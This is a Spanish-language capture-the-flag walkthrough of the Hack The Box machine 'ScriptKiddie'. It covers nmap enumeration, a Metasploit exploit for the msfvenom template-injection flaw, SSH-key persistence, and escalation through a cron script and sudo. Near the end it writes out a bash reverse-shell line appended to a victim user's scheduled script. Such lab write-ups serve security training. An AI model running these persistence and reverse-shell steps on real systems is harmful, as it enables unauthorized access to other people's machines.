---
description: 'https://www.hackthebox.eu/home/machines/profile/314'
---

# ScriptKiddie

Maquina Linux con dos puertos abiertos 22:ssh y 5000:upnp.

![](../../.gitbook/assets/0.png)

## Enumeración

Realizamos un escaneo con nmap para saber los puertos abiertos en el rango de 1-65536 puertos.

```text
nmap -p- --open -n -T5 10.10.10.226 -oG allPorts
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 20:55 CST
Nmap scan report for 10.10.10.226
Host is up (0.075s latency).
Not shown: 65533 closed ports
PORT STATE SERVICE
22/tcp open ssh
5000/tcp open upnp
Nmap done: 1 IP address (1 host up) scanned in 26.92 seconds
```

| Bandera | Descripción |
| :--- | :--- |
| -p- | Escaneo a los 65536 puertos |
| --open | Reporta solo los puertos con estado "open". |
| -T5 | Exploracion a velocidades insanas \(lo hago porque es un entorno de pruebas\). |
| -v | Muestra más información sobre el sondeo que se está realizando. |
| -oG allPorts | Exporta los resultados en un formato Grepable con el nombre de allPorts. |

Posteriormente verificamos la versión de los servicios en los puertos abiertos y lanzamos los scripts por defecto.

```text
nmap -sCV -p22,5000 10.10.10.226 -oN targeted
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 20:57 CST
Nmap scan report for 10.10.10.226
Host is up (0.072s latency).
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
| 256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_ 256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.94 seconds
```

| Bandera | Descripción |
| :--- | :--- |
| -p22,80,9001 | Escaneo a los puertos 22, 80 y 9001. |
| -sC | Escanea con los scripts por defecto. |
| -sV | Intenta determinar la versión del servicio que se ejecuta en el puerto. |
| -oN | Exporta los resultados en un formato nmap. |

Utilizando dirsearch, no hay resultado alguno de directorios, por lo que visitamos la pagina asi tal cual.

![](../../.gitbook/assets/1%20%2814%29.png)

Si intentamos realizar algún tipo de ataque en el campo, sale lo siguiente:

![](../../.gitbook/assets/2%20%284%29.png)

## Explotación

Lo importante es que podemos subir un, template en payloads, por lo que haciendo una simple búsqueda en google como “metasploit venom template exploit”, obtuve el siguiente resultado:

{% embed url="https://www.exploit-db.com/exploits/49491" %}

{% embed url="https://github.com/nikhil1232/CVE-2020-7384" %}

Abrimos metasploit y buscamos el exploit.

![](../../.gitbook/assets/3%20%2813%29.png)

```text
# use 0
# show options
# set lhost tun0
#exploit
```

Cargamos el archivo generado y no nos ponemos en escucha para recibir la conexión.

![](../../.gitbook/assets/4%20%2812%29.png)

El puerto es el 4444, por defecto.

![](../../.gitbook/assets/5%20%289%29.png)

## Generando persistencia.

```text
# ssh-keygen
# echo $(cat /tmp/id_rsa.pub) >> authorized_keys
```

## Movimiento lateral.

### Usuario pwn

Script interesante del usuario pwn, el cual se ejecuta como tarea programada y al cual tenemos permisos de escritura.

![](../../.gitbook/assets/6%20%2812%29.png)

![](../../.gitbook/assets/7%20%285%29.png)

echo "bash -c 'bash -i &gt;& /dev/tcp/ip/port 0&gt;&1'" &gt;&gt; /home/pwn/scanlosers.sh

## Escalación de privilegios.

Una vez en pwn.

```text
sudo -l
sudo metasploit
id
```



